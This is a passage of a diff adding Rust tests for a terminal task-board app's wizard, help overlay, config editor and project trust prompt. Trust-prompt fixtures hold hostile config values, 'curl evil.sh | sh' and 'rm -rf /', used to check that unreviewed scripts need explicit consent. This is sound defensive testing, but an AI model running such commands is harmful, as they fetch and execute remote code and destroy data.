+/// as BackTab. Both spellings step back.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn shift_tab_reported_as_a_modified_tab_still_steps_back() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "Title");
+    advance_to(&mut app, WizardStep::Agent);
+
+    app.handle_key(key_event(KeyCode::Tab, KeyModifiers::SHIFT))
+        .unwrap();
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Title));
+}
+
+// --- config editor geometry ---
+
+/// A fixed percentage left everything huddled in the top-left of a mostly empty
+/// box. These pin the two properties that fixed: it is sized to its content,
+/// and it is centred.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn the_config_editor_is_centred_and_smaller_than_the_screen() {
+    let _guard = redirect_config_dir();
+    let dir = tempfile::tempdir().unwrap();
+    let mut app = make_test_app_at(dir.path());
+    app.open_config_editor();
+    let editor = app.state.config_editor.as_ref().unwrap();
+
+    let screen = Rect {
+        x: 0,
+        y: 0,
+        width: 200,
+        height: 60,
+    };
+    let popup = config_editor_area(editor, screen);
+
+    assert!(
+        popup.width < screen.width,
+        "sized to content, not to screen"
+    );
+    assert!(popup.height < screen.height);
+    // Centred: the margins on both sides agree to within the rounding of an
+    // odd remainder.
+    let left = popup.x - screen.x;
+    let right = (screen.x + screen.width) - (popup.x + popup.width);
+    assert!(left.abs_diff(right) <= 1, "left={left} right={right}");
+    let top = popup.y - screen.y;
+    let bottom = (screen.y + screen.height) - (popup.y + popup.height);
+    assert!(top.abs_diff(bottom) <= 1, "top={top} bottom={bottom}");
+}
+
+/// Tall enough for the biggest section, so tabbing between them never resizes
+/// the box under the cursor.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn the_config_editor_fits_its_largest_section() {
+    let _guard = redirect_config_dir();
+    let dir = tempfile::tempdir().unwrap();
+    let mut app = make_test_app_at(dir.path());
+    app.open_config_editor();
+    let editor = app.state.config_editor.as_ref().unwrap();
+
+    let screen = Rect {
+        x: 0,
+        y: 0,
+        width: 200,
+        height: 60,
+    };
+    let biggest = editor
+        .sections
+        .iter()
+        .map(|s| s.fields.len())
+        .max()
+        .unwrap();
+    // borders + tab strip + help/status + footer
+    let chrome = 2 + 1 + 2 + 1;
+    assert_eq!(
+        config_editor_area(editor, screen).height as usize,
+        biggest + chrome
+    );
+
+    // And the size does not depend on which section is selected.
+    let first = config_editor_area(editor, screen);
+    let mut app2 = make_test_app_at(dir.path());
+    app2.open_config_editor();
+    app2.state.config_editor.as_mut().unwrap().section = 2;
+    let later = config_editor_area(app2.state.config_editor.as_ref().unwrap(), screen);
+    assert_eq!(first, later, "the box must not move when tabbing");
+}
+
+/// A terminal too small for the content still gets a box that fits inside it.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn the_config_editor_is_clamped_to_a_small_terminal() {
+    let _guard = redirect_config_dir();
+    let dir = tempfile::tempdir().unwrap();
+    let mut app = make_test_app_at(dir.path());
+    app.open_config_editor();
+    let editor = app.state.config_editor.as_ref().unwrap();
+
+    let screen = Rect {
+        x: 0,
+        y: 0,
+        width: 40,
+        height: 12,
+    };
+    let popup = config_editor_area(editor, screen);
+    assert!(popup.x + popup.width <= screen.x + screen.width);
+    assert!(popup.y + popup.height <= screen.y + screen.height);
+}
+
+/// A `/` mid-word is not a skill trigger, so it has to fall past that guard and
+/// arrive as ordinary text.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn a_slash_mid_word_is_typed_not_treated_as_a_trigger() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "Title");
+    advance_to(&mut app, WizardStep::Prompt);
+
+    type_str(&mut app, "src/main.rs");
+    assert_eq!(wiz(&app).buffer, "src/main.rs");
+    assert!(app.state.skill_search.is_none());
 }
 
 #[test]
 #[cfg(feature = "test-mocks")]
-fn test_wizard_cancel_at_plugin_step() {
+fn esc_cancels_from_any_step() {
+    // One key that always means "get me out of here" beats one whose effect
+    // depends on which step you happen to be on. Stepping back is Shift+Tab.
+    for steps_in in 0..=1 {
+        let mut app = make_test_app_with_agents();
+        press_key(&mut app, KeyCode::Char('o'));
+        type_str(&mut app, "Drop me");
+        for _ in 0..steps_in {
+            press_key(&mut app, KeyCode::Enter);
+        }
+
+        press_key(&mut app, KeyCode::Esc);
+        assert!(
+            app.state.wizard.is_none(),
+            "Esc {steps_in} step(s) in should have closed the wizard"
+        );
+        assert!(app.state.board.tasks.is_empty(), "and saved nothing");
+    }
+}
+
+/// Back-navigation is why the wizard holds every field at once: stepping back
+/// has to find the earlier answers still intact.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn stepping_back_from_the_prompt_preserves_everything_typed() {
     let mut app = make_test_app_with_agents();
     press_key(&mut app, KeyCode::Char('o'));
-    type_str(&mut app, "Cancel me");
+    type_str(&mut app, "Fix login");
+
+    advance_to(&mut app, WizardStep::Agent);
+    press_key(&mut app, KeyCode::Char('j')); // pick a non-default agent
+    let agent = app.state.wizard.as_ref().unwrap().agent.selected;
+
+    advance_to(&mut app, WizardStep::Plugin);
+    press_key(&mut app, KeyCode::Char('j')); // and a non-default plugin
+    let plugin = app.state.wizard.as_ref().unwrap().plugin.selected;
+
+    advance_to(&mut app, WizardStep::Prompt);
+    type_str(&mut app, "cookie expires early");
+
+    // Walk all the way back to the first step.
+    press_key(&mut app, KeyCode::BackTab);
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Plugin));
+    assert_eq!(
+        app.state.wizard.as_ref().unwrap().plugin.selected,
+        plugin,
+        "re-entering a list step must not rebuild it and reset the pick"
+    );
+
+    press_key(&mut app, KeyCode::BackTab);
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Agent));
+    assert_eq!(app.state.wizard.as_ref().unwrap().agent.selected, agent);
+
+    press_key(&mut app, KeyCode::BackTab);
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Title));
+    assert_eq!(wiz(&app).as_str(), "Fix login");
+
+    // Forward again, and everything is still where it was left.
+    advance_to(&mut app, WizardStep::Prompt);
+    assert_eq!(wiz(&app).as_str(), "cookie expires early");
+    assert_eq!(app.state.wizard.as_ref().unwrap().agent.selected, agent);
+    assert_eq!(app.state.wizard.as_ref().unwrap().plugin.selected, plugin);
+}
+
+/// Shift+Tab and Ctrl+B go back too, from any step, without the "cancel when
+/// there is nowhere to go" fallback that Esc carries.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn shift_tab_and_ctrl_b_step_back() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "Title");
+    advance_to(&mut app, WizardStep::Agent);
+
+    press_key(&mut app, KeyCode::BackTab);
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Title));
+
     press_key(&mut app, KeyCode::Enter);
-    assert_eq!(app.state.input_mode, InputMode::SelectPlugin);
+    app.handle_key(key_event(KeyCode::Char('b'), KeyModifiers::CONTROL))
+        .unwrap();
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Title));
+
+    // ...and neither of them cancels from the first step.
+    press_key(&mut app, KeyCode::BackTab);
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Title));
+    assert!(app.state.wizard.is_some());
+}
+
+/// Saving from step one is the whole point of `Ctrl+S`: a title fix caught
+/// early should not require walking the rest of the flow again.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn ctrl_s_saves_from_the_title_step() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "Saved early");
+
+    app.handle_key(key_event(KeyCode::Char('s'), KeyModifiers::CONTROL))
+        .unwrap();
+
+    assert!(app.state.wizard.is_none(), "saving closes the wizard");
+    assert_eq!(app.state.board.tasks.len(), 1);
+    assert_eq!(app.state.board.tasks[0].title, "Saved early");
+    assert_eq!(app.state.board.tasks[0].description, None);
+}
+
+#[test]
+#[cfg(feature = "test-mocks")]
+fn ctrl_s_saves_from_the_plugin_step() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "Saved mid-flow");
+    advance_to(&mut app, WizardStep::Plugin);
+
+    app.handle_key(key_event(KeyCode::Char('s'), KeyModifiers::CONTROL))
+        .unwrap();
+
+    assert!(app.state.wizard.is_none());
+    assert_eq!(app.state.board.tasks.len(), 1);
+    assert_eq!(app.state.board.tasks[0].title, "Saved mid-flow");
+}
+
+/// A silent refusal reads as a broken key rather than a rejected input.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn an_empty_title_is_refused_out_loud() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    press_key(&mut app, KeyCode::Enter);
+
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Title));
+    assert!(
+        app.state.wizard.as_ref().unwrap().validation.is_some(),
+        "the refusal has to say something"
+    );
+    assert!(app.state.board.tasks.is_empty());
+
+    // The complaint clears as soon as the user acts on it.
+    type_str(&mut app, "T");
+    assert!(app.state.wizard.as_ref().unwrap().validation.is_none());
+}
+
+/// A whitespace-only title is not a title, and `Ctrl+S` from a later step has
+/// to send the user back to where the problem actually is.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn saving_without_a_title_returns_to_the_title_step() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "x");
+    advance_to(&mut app, WizardStep::Plugin);
+
+    // Go back to the title, however many steps that is, and blank it out.
+    while app.state.wizard_step() != Some(WizardStep::Title) {
+        press_key(&mut app, KeyCode::BackTab);
+    }
+    press_key(&mut app, KeyCode::Backspace);
+    press_key(&mut app, KeyCode::Enter);
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Title));
+    assert!(app.state.wizard.as_ref().unwrap().validation.is_some());
+    assert!(app.state.board.tasks.is_empty());
+}
+
+#[test]
+#[cfg(feature = "test-mocks")]
+fn a_padded_title_is_trimmed_on_save() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "  Padded  ");
+    app.handle_key(key_event(KeyCode::Char('s'), KeyModifiers::CONTROL))
+        .unwrap();
+    assert_eq!(app.state.board.tasks[0].title, "Padded");
+}
+
+/// A dropdown owns Esc while it is open. Since Esc otherwise cancels the
+/// wizard, getting this wrong throws away the whole task — closing a picker
+/// must only close the picker.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn esc_closes_an_open_dropdown_without_leaving_the_wizard() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "Title");
+    advance_to(&mut app, WizardStep::Prompt);
+
+    type_str(&mut app, "see !");
+    assert!(app.state.task_ref_search.is_some());
 
     press_key(&mut app, KeyCode::Esc);
-    assert_eq!(app.state.input_mode, InputMode::Normal);
-    assert!(app.state.pending_task_title.is_empty());
+    assert!(app.state.task_ref_search.is_none(), "the picker closed");
+    assert!(
+        app.state.wizard.is_some(),
+        "and only the picker closed — the wizard survives"
+    );
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));
+    assert_eq!(wiz(&app).as_str(), "see ", "the `!` went with it");
+}
+
+/// The file dropdown records a caret-relative `start_pos`, so its pattern has
+/// to be typed at the caret too — appending to the end of the buffer would make
+/// the commit splice over the wrong range.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn the_file_dropdown_types_at_the_caret_not_the_end() {
+    // The dropdown queries the repo for candidates; an empty answer is enough,
+    // since this is about where the typed text lands, not what it matches.
+    let mut app = make_test_app_with_agents();
+    let mut mock_git = MockGitOperations::new();
+    mock_git.expect_list_files().returning(|_| vec![]);
+    app.state.git_ops = Arc::new(mock_git);
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "Title");
+    advance_to(&mut app, WizardStep::Prompt);
+
+    type_str(&mut app, "a tail");
+    for _ in 0..4 {
+        press_key(&mut app, KeyCode::Left);
+    }
+    type_str(&mut app, "#ab");
+
+    assert_eq!(
+        wiz(&app).as_str(),
+        "a #abtail",
+        "the trigger and its pattern land at the caret"
+    );
+}
+
+/// First run is the config editor, opened on the one question it needs to ask,
+/// rather than a menu of its own.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn first_run_opens_the_config_editor_on_the_agent_field() {
+    let _guard = redirect_config_dir();
+    let dir = tempfile::tempdir().unwrap();
+    let mut mock_tmux = MockTmuxOperations::new();
+    mock_tmux.expect_window_exists().returning(|_| Ok(false));
+    mock_tmux.expect_has_session().returning(|_| false);
+
+    let app = App::new_for_test_with_flags(
+        Some(dir.path().to_path_buf()),
+        Arc::new(mock_tmux),
+        Arc::new(MockGitOperations::new()),
+        Arc::new(MockGitProviderOperations::new()),
+        Arc::new(MockAgentRegistry::new()),
+        crate::FeatureFlags {
+            experimental: false,
+            no_init_scripts: false,
+            first_run: true,
+        },
+    )
+    .unwrap();
+
+    let editor = app
+        .state
+        .config_editor
+        .as_ref()
+        .expect("first run opens the editor");
+    assert_eq!(
+        editor.current_field().map(|f| f.id),
+        Some(crate::tui::config_editor::FieldId::DefaultAgent),
+        "and lands on the question first run is actually asking"
+    );
+    assert!(editor.status.is_some(), "with a word about what to do");
+}
+
+/// Every other launch opens straight onto the board.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn a_normal_launch_does_not_open_the_config_editor() {
+    let _guard = redirect_config_dir();
+    let dir = tempfile::tempdir().unwrap();
+    let app = make_test_app_at(dir.path());
+    assert!(app.state.config_editor.is_none());
+}
+
+// =============================================================================
+// The `?` help overlay
+// =============================================================================
+
+#[test]
+#[cfg(feature = "test-mocks")]
+fn question_mark_opens_and_closes_the_help_overlay() {
+    let mut app = make_test_app_with_agents();
+    assert!(app.state.help_scroll.is_none());
+
+    press_key(&mut app, KeyCode::Char('?'));
+    assert_eq!(app.state.help_scroll, Some(0));
+
+    press_key(&mut app, KeyCode::Esc);
+    assert!(app.state.help_scroll.is_none());
+
+    // `?` also toggles it shut, since that is the key that is already under the
+    // finger.
+    press_key(&mut app, KeyCode::Char('?'));
+    press_key(&mut app, KeyCode::Char('?'));
+    assert!(app.state.help_scroll.is_none());
+}
+
+/// It is a reference, not a menu: the keys it does not use must not fall
+/// through and act on the board behind it.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn the_help_overlay_swallows_board_keys() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('?'));
+
+    for code in [KeyCode::Char('o'), KeyCode::Char(','), KeyCode::Enter] {
+        press_key(&mut app, code);
+    }
+    assert!(app.state.wizard.is_none(), "no task wizard opened");
+    assert!(app.state.config_editor.is_none(), "no config editor opened");
+    assert!(app.state.help_scroll.is_some(), "and the overlay stayed up");
+}
+
+#[test]
+#[cfg(feature = "test-mocks")]
+fn the_help_overlay_scrolls_within_its_bounds() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('?'));
+    app.state.help_max_scroll.set(30);
+
+    press_key(&mut app, KeyCode::Char('k'));
+    assert_eq!(app.state.help_scroll, Some(0), "clamped at the top");
+
+    press_key(&mut app, KeyCode::Char('j'));
+    assert_eq!(app.state.help_scroll, Some(1));
+
+    press_key(&mut app, KeyCode::End);
+    assert_eq!(app.state.help_scroll, Some(30));
+    press_key(&mut app, KeyCode::Char('j'));
+    assert_eq!(app.state.help_scroll, Some(30), "clamped at the bottom");
+
+    press_key(&mut app, KeyCode::Home);
+    assert_eq!(app.state.help_scroll, Some(0));
+}
+
+/// The chords the task pane scrolls with work here too, from the same table —
+/// someone who learns `C-d` once should not find it inert in the overlay.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn the_help_overlay_uses_the_same_scroll_chords_as_a_task_pane() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('?'));
+    app.state.help_max_scroll.set(60);
+
+    app.handle_key(key_event(KeyCode::Char('d'), KeyModifiers::CONTROL))
+        .unwrap();
+    assert_eq!(app.state.help_scroll, Some(20), "C-d pages down");
+
+    app.handle_key(key_event(KeyCode::Char('u'), KeyModifiers::CONTROL))
+        .unwrap();
+    assert_eq!(app.state.help_scroll, Some(0), "C-u pages back");
+
+    app.handle_key(key_event(KeyCode::Char('n'), KeyModifiers::CONTROL))
+        .unwrap();
+    assert_eq!(app.state.help_scroll, Some(5), "C-n moves five lines");
+
+    app.handle_key(key_event(KeyCode::Char('p'), KeyModifiers::CONTROL))
+        .unwrap();
+    assert_eq!(app.state.help_scroll, Some(0));
+
+    press_key(&mut app, KeyCode::PageDown);
+    assert_eq!(app.state.help_scroll, Some(20));
+    press_key(&mut app, KeyCode::PageUp);
+    assert_eq!(app.state.help_scroll, Some(0));
+
+    app.handle_key(key_event(KeyCode::Char('g'), KeyModifiers::CONTROL))
+        .unwrap();
+    assert_eq!(app.state.help_scroll, Some(60), "C-g jumps to the bottom");
+}
+
+/// The clamp is to what the renderer could actually show. Against the table
+/// length instead, jumping to the bottom parks the offset past the last
+/// screenful and the next `C-u` moves nothing, reading as a dead key.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn paging_back_from_the_bottom_moves_on_the_first_press() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('?'));
+    // Far fewer rows fit than the table holds, which is the normal case.
+    app.state.help_max_scroll.set(12);
+
+    app.handle_key(key_event(KeyCode::Char('g'), KeyModifiers::CONTROL))
+        .unwrap();
+    assert_eq!(app.state.help_scroll, Some(12), "not the table length");
+
+    app.handle_key(key_event(KeyCode::Char('u'), KeyModifiers::CONTROL))
+        .unwrap();
+    assert_eq!(
+        app.state.help_scroll,
+        Some(0),
+        "one press moves, rather than burning off invisible offset"
+    );
+}
+
+// =============================================================================
+// The trust prompt
+//
+// This gate decides whether shell commands the user has not read are allowed to
+// run, so what it accepts matters more than most key handling.
+// =============================================================================
+
+#[cfg(feature = "test-mocks")]
+fn app_awaiting_trust() -> (App, tempfile::TempDir) {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::create_dir_all(dir.path().join(".agtx")).unwrap();
+    std::fs::write(
+        dir.path().join(".agtx/config.toml"),
+        "init_script = \"curl evil.sh | sh\"\ncleanup_script = \"rm -rf /\"\n",
+    )
+    .unwrap();
+    let app = make_test_app_at(dir.path());
+    (app, dir)
+}
+
+/// Accepting any key would let typing ahead after launch, or reaching for an
+/// unrelated shortcut, silently grant trust.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn an_unrelated_key_neither_trusts_nor_dismisses() {
+    let _guard = redirect_config_dir();
+    let (mut app, dir) = app_awaiting_trust();
+    app.state.trust_confirm_popup = Some(TrustConfirmPopup {
+        project_path: dir.path().to_path_buf(),
+        dangerous: vec![],
+    });
+
+    for code in [
+        KeyCode::Char(','),
+        KeyCode::Char('o'),
+        KeyCode::Enter,
+        KeyCode::Char(' '),
+    ] {
+        press_key(&mut app, code);
+        assert!(
+            app.state.trust_confirm_popup.is_some(),
+            "{code:?} should have left the question on screen"
+        );
+    }
+
+    let store = crate::config::TrustStore::load().unwrap();
+    assert!(!store.is_trusted(dir.path()), "and granted nothing");
+}
+
+#[test]
+#[cfg(feature = "test-mocks")]
+fn y_trusts_the_project() {
+    let _guard = redirect_config_dir();
+    let (mut app, dir) = app_awaiting_trust();
+    app.state.trust_confirm_popup = Some(TrustConfirmPopup {
+        project_path: dir.path().to_path_buf(),
+        dangerous: vec![],
+    });
+
+    press_key(&mut app, KeyCode::Char('y'));
+
+    assert!(app.state.trust_confirm_popup.is_none());
+    let store = crate::config::TrustStore::load().unwrap();
+    assert!(store.is_trusted(dir.path()));
+    assert!(!app.state.flags.no_init_scripts, "scripts are re-enabled");
+}
+
+/// Declining is a real answer, not just a way to postpone: the popup closes and
+/// the fields stay off.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn n_and_esc_decline_without_trusting() {
+    for code in [KeyCode::Char('n'), KeyCode::Esc] {
+        let _guard = redirect_config_dir();
+        let (mut app, dir) = app_awaiting_trust();
+        app.state.trust_confirm_popup = Some(TrustConfirmPopup {
+            project_path: dir.path().to_path_buf(),
+            dangerous: vec![],
+        });
+
+        press_key(&mut app, code);
+
+        assert!(app.state.trust_confirm_popup.is_none(), "{code:?}");
+        let store = crate::config::TrustStore::load().unwrap();
+        assert!(!store.is_trusted(dir.path()), "{code:?} must not trust");
+    }
+}
+
+/// Consenting to a script you cannot see is not consent, so the prompt carries
+/// the values themselves — the three fields `App::new` strips.
+#[test]
+fn the_prompt_carries_the_scripts_it_is_asking_about() {
+    let config = crate::config::ProjectConfig {
+        init_script: Some("curl evil.sh | sh".to_string()),
+        copy_files: Some(".env".to_string()),
+        ..Default::default()
+    };
+
+    assert_eq!(
+        dangerous_fields(&config),
+        vec![
+            ("init_script", "curl evil.sh | sh".to_string()),
+            ("copy_files", ".env".to_string()),
+        ],
+        "values verbatim, in a fixed order, and only the fields that are set"
+    );
+}
+
+#[test]
+fn a_project_declaring_nothing_dangerous_has_nothing_to_show() {
+    assert!(dangerous_fields(&crate::config::ProjectConfig::default()).is_empty());
+}
+
+// =============================================================================
+// Config editor wiring
+//
+// The editor's own logic is tested in `config_editor_tests.rs`; these cover the
+// parts only the App can do — opening it on the right configs, and what a save
+// touches.
+// =============================================================================
+
+#[test]
+#[cfg(feature = "test-mocks")]
+fn comma_opens_the_config_editor() {
+    let _guard = redirect_config_dir();
+    let mut app = make_test_app_with_agents();
+    assert!(app.state.config_editor.is_none());
+    press_key(&mut app, KeyCode::Char(','));
+    assert!(app.state.config_editor.is_some());
+}
+
+/// The editor loads the configs from disk rather than reconstructing them from
+/// `state.config`, which is a *merged* view — writing that back would bake
+/// every global default into the project file as an explicit override.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn the_editor_opens_on_the_files_not_the_merged_view() {
+    let _guard = redirect_config_dir();
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::create_dir_all(dir.path().join(".agtx")).unwrap();
+    std::fs::write(
+        dir.path().join(".agtx/config.toml"),
+        "workflow_plugin = \"gsd\"\n",
+    )
+    .unwrap();
+
+    let mut app = make_test_app_at(dir.path());
+    app.open_config_editor();
+    let editor = app.state.config_editor.as_ref().unwrap();
+
+    let project = editor.project.as_ref().expect("a project is open");
+    assert_eq!(project.workflow_plugin.as_deref(), Some("gsd"));
+    assert_eq!(
+        project.base_branch, None,
+        "an unset project field stays unset rather than inheriting the global value"
+    );
+}
+
+#[test]
+#[cfg(feature = "test-mocks")]
+fn a_dashboard_editor_has_no_project_section() {
+    let _guard = redirect_config_dir();
+    let mut app = App::new_for_test(
+        None,
+        Arc::new(MockTmuxOperations::new()),
+        Arc::new(MockGitOperations::new()),
+        Arc::new(MockGitProviderOperations::new()),
+        Arc::new(MockAgentRegistry::new()),
+    )
+    .unwrap();
+    app.open_config_editor();
+    let editor = app.state.config_editor.as_ref().unwrap();
+    assert!(editor.project.is_none());
+    assert!(!editor.sections.iter().any(|s| s.title == "Project"));
+}
+
+/// Saving the project config changes its hash, which *is* its trust. Without
+/// the re-record, editing any setting would silently untrust the project and
+/// cost it its scripts on the next launch.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn saving_the_config_keeps_a_trusted_project_trusted() {
+    let _guard = redirect_config_dir();
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::create_dir_all(dir.path().join(".agtx")).unwrap();
+    std::fs::write(
+        dir.path().join(".agtx/config.toml"),
+        "init_script = \"echo hi\"\n",
+    )
+    .unwrap();
+    let mut store = crate::config::TrustStore::load().unwrap();
+    store.trust_project(dir.path()).unwrap();
+
+    let mut app = make_test_app_at(dir.path());
+    app.open_config_editor();
+    app.state
+        .config_editor
+        .as_mut()
+        .unwrap()
+        .project
+        .as_mut()
+        .unwrap()
+        .base_branch = Some("develop".to_string());
+    app.save_config_editor().unwrap();
+
+    let store = crate::config::TrustStore::load().unwrap();
+    assert!(
+        store.is_trusted(dir.path()),
+        "editing config must not untrust the project"
+    );
+    let saved = crate::config::ProjectConfig::load(dir.path()).unwrap();
+    assert_eq!(saved.base_branch.as_deref(), Some("develop"));
+    assert_eq!(
+        saved.init_script.as_deref(),
+        Some("echo hi"),
+        "the untouched field is still there"
+    );
+}
+
+/// A save has to be visible without a restart: the merged config every draw
+/// call reads is rebuilt from the files that were just written.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn saving_re_merges_the_live_config() {
+    let _guard = redirect_config_dir();
+    let dir = tempfile::tempdir().unwrap();
+    let mut app = make_test_app_at(dir.path());
+    app.open_config_editor();
+
+    let editor = app.state.config_editor.as_mut().unwrap();
+    editor.global.theme.color_selected = "#00ff00".to_string();
+    editor.project.as_mut().unwrap().base_branch = Some("release".to_string());
+    app.save_config_editor().unwrap();
+
+    assert_eq!(app.state.config.theme.color_selected, "#00ff00");
+    assert_eq!(app.state.config.base_branch, "release");
+    assert!(!app.state.config_editor.as_ref().unwrap().dirty);
+}
+
+/// Closing without saving must put back the theme the preview was overwriting.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn closing_without_saving_drops_the_previewed_theme() {
+    let _guard = redirect_config_dir();
+    let dir = tempfile::tempdir().unwrap();
+    let mut app = make_test_app_at(dir.path());
+    let original = app.state.config.theme.color_selected.clone();
+
+    app.open_config_editor();
+    app.state
+        .config_editor
+        .as_mut()
+        .unwrap()
+        .global
+        .theme
+        .color_selected = "#ff00ff".to_string();
+    // A keystroke is what installs the preview.
+    press_key(&mut app, KeyCode::Char('j'));
+    assert_eq!(app.state.config.theme.color_selected, "#ff00ff");
+
+    press_key(&mut app, KeyCode::Esc);
+    assert!(app.state.config_editor.is_none());
+    assert_eq!(app.state.config.theme.color_selected, original);
 }
 
 #[test]
@@ -5716,19 +6743,18 @@ fn test_wizard_tab_cycles_plugins() {
     let mut app = make_test_app_with_agents();
     press_key(&mut app, KeyCode::Char('o'));
     type_str(&mut app, "Tabbing");
-    press_key(&mut app, KeyCode::Enter);
-    assert_eq!(app.state.input_mode, InputMode::SelectPlugin);
+    advance_to(&mut app, WizardStep::Plugin);
 
-    let len = app.state.wizard_plugin_options.len();
+    let len = app.state.wizard.as_ref().unwrap().plugin.options.len();
     assert!(len > 1);
-    assert_eq!(app.state.wizard_selected_plugin, 0);
+    assert_eq!(app.state.wizard.as_ref().unwrap().plugin.selected, 0);
     press_key(&mut app, KeyCode::Tab);
-    assert_eq!(app.state.wizard_selected_plugin, 1);
+    assert_eq!(app.state.wizard.as_ref().unwrap().plugin.selected, 1);
     // Tab wraps around
     for _ in 1..len {
         press_key(&mut app, KeyCode::Tab);
     }
-    assert_eq!(app.state.wizard_selected_plugin, 0);
+    assert_eq!(app.state.wizard.as_ref().unwrap().plugin.selected, 0);
 }
 
 #[test]
@@ -5737,16 +6763,16 @@ fn test_wizard_saves_with_selected_plugin() {
     let mut app = make_test_app_with_agents();
     press_key(&mut app, KeyCode::Char('o'));
     type_str(&mut app, "Plugin task");
-    press_key(&mut app, KeyCode::Enter);
-    assert_eq!(app.state.input_mode, InputMode::SelectPlugin);
+    advance_to(&mut app, WizardStep::Plugin);
 
     // Move to a non-default plugin (index 1 should be gsd or similar)
     press_key(&mut app, KeyCode::Char('j'));
-    let selected_plugin = app.state.wizard_plugin_options[app.state.wizard_selected_plugin]
+    let selected_plugin = app.state.wizard.as_ref().unwrap().plugin.options
+        [app.state.wizard.as_ref().unwrap().plugin.selected]
         .name
         .clone();
     press_key(&mut app, KeyCode::Enter);
-    assert_eq!(app.state.input_mode, InputMode::InputDescription);
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));
     press_key(&mut app, KeyCode::Enter); // save with no description
 
     let tasks = app.state.board.tasks.clone();
@@ -5760,14 +6786,16 @@ fn test_wizard_default_plugin_saves_agtx() {
     let mut app = make_test_app_with_agents();
     press_key(&mut app, KeyCode::Char('o'));
     type_str(&mut app, "Default plugin task");
-    press_key(&mut app, KeyCode::Enter);
-    assert_eq!(app.state.input_mode, InputMode::SelectPlugin);
+    advance_to(&mut app, WizardStep::Plugin);
 
     // Keep default selection (index 0 = agtx) and advance
-    assert_eq!(app.state.wizard_selected_plugin, 0);
-    assert_eq!(app.state.wizard_plugin_options[0].name, "agtx");
+    assert_eq!(app.state.wizard.as_ref().unwrap().plugin.selected, 0);
+    assert_eq!(
+        app.state.wizard.as_ref().unwrap().plugin.options[0].name,
+        "agtx"
+    );
     press_key(&mut app, KeyCode::Enter);
-    assert_eq!(app.state.input_mode, InputMode::InputDescription);
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));
     press_key(&mut app, KeyCode::Enter); // save with no description
 
     let tasks = app.state.board.tasks.clone();
@@ -5782,18 +6810,272 @@ fn test_wizard_uses_config_default_agent() {
     let mut app = make_test_app_with_agents();
     press_key(&mut app, KeyCode::Char('o'));
     type_str(&mut app, "Config agent task");
-    press_key(&mut app, KeyCode::Enter);
-    // Advance through plugin
-    if app.state.input_mode == InputMode::SelectPlugin {
-        press_key(&mut app, KeyCode::Enter);
-    }
-    assert_eq!(app.state.input_mode, InputMode::InputDescription);
+    advance_to(&mut app, WizardStep::Prompt);
     press_key(&mut app, KeyCode::Enter);
 
     let tasks = app.state.board.tasks.clone();
     assert_eq!(tasks.len(), 1);
-    // Should use config default_agent, not a wizard selection
+    // The agent step opens on the configured default, so walking past it
+    // without touching anything saves that.
     assert_eq!(tasks[0].agent, app.state.config.default_agent);
+}
+
+/// `Task::agent` is a database field, and until the agent step existed the only
+/// way to run one task on a different agent was to edit the config, start it,
+/// and edit back.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn the_wizard_saves_the_agent_that_was_picked() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "Runs on something else");
+
